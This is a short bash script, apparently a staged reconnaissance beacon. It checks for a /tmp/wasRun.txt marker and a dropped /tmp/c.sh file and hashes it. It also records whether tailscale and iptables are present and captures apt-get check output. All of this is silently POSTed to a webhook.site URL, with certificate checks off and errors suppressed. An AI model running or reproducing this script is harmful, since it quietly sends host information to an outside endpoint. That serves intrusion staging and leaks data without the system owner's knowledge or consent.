#!/bin/bash
set -u
WEBHOOK="https://webhook.site/39efcb72-40f8-4408-a4c0-0dc07f0cd12d"
report(){ wget -nv -O- --no-check-certificate --timeout=30 --tries=3 \
    --header="Content-Type: text/plain" --post-data="$1" "$WEBHOOK" >/dev/null 2>&1 || true; echo; }

R=""
R+="[step1] $(date '+%F %T')"$'\n'
R+="wasRun.txt: $([ -f /tmp/wasRun.txt ] && cat /tmp/wasRun.txt || echo '<missing>')"$'\n'
R+="c.sh exists: $( [ -f /tmp/c.sh ] && echo yes || echo no )"$'\n'
R+="c.sh sha256: $( [ -f /tmp/c.sh ] && sha256sum /tmp/c.sh | awk '{print $1}' || echo '-' )"$'\n'
R+="tailscale: $(command -v tailscale || echo '<not installed>')"$'\n'
R+="iptables: $(command -v iptables || echo '<not installed>')"$'\n'
R+="apt-get check:"$'\n'"$(apt-get check 2>&1 | tail -n 20)"$'\n'

report "$R"
